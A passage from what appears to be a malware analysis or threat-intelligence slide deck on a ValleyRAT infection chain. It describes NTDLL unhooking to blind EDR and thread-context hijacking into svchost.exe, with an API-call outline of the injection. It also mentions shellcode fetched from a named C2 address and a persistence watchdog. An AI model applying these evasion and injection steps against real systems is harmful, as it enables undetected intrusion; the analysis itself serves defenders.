06 · Defense Evasion T1562.001
NTDLL Unhooking — EDR Blind at User-Mode Level Too
  • EDR places JMP hooks at the start of NTDLL.dll functions to intercept all syscalls
  • DLL reads a fresh, completely unhooked copy of ntdll.dll directly from disk
  • Overwrites the hooked bytes in live memory with the original clean instruction bytes
  • All JMP hooks removed — syscalls now reach the kernel directly with no interception
  • Combined effect: BYOVD killed EDR at kernel level + Unhooking blinds it at user-mode
// Before unhooking — EDR hook intercepts every syscall: NtCreateProcess: JMP 0x7FFE1234 -> EDR_Inspector -> EDR logs call // After unhooking — original bytes restored: NtCreateProcess: MOV R10, RCX MOV EAX, 0x4C <- original syscall stub SYSCALL <- goes straight to kernel RET <- EDR sees nothing

07 · C2 Communication + Process Injection T1055.003
Thread-Context Hijacking → ValleyRAT Lives Inside svchost.exe
  • DLL fetches shellcode from C2 server: 43.128.26[.]132 — shellcode never touches disk
  • Finds an existing svchost.exe instance (trusted Windows system process)
  • Allocates RWX memory region inside svchost.exe via VirtualAllocEx()
  • Writes the ValleyRAT shellcode into allocated region via WriteProcessMemory()
  • Finds an existing thread inside svchost, suspends it via SuspendThread()
  • Reads thread context, redirects RIP to shellcode, resumes — no new thread created
OpenProcess(PROCESS_ALL_ACCESS, svchost_PID) VirtualAllocEx(hProc, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE) WriteProcessMemory(hProc, pRemote, shellcode, size) OpenThread(THREAD_ALL_ACCESS, thread_id) SuspendThread(hThread) GetThreadContext(hThread, &ctx) ctx.Rip = (DWORD64)pRemoteMemory // redirect to shellcode SetThreadContext(hThread, &ctx) ResumeThread(hThread) // ValleyRAT is now executing

08 · Persistence — Dual Watchdog Survival Architecture T1053.005
Two Independent Recovery Layers Ensure Malware Stays Alive

  • If ValleyRAT disappears → re-fetches shellcode from C2 server and re-injects
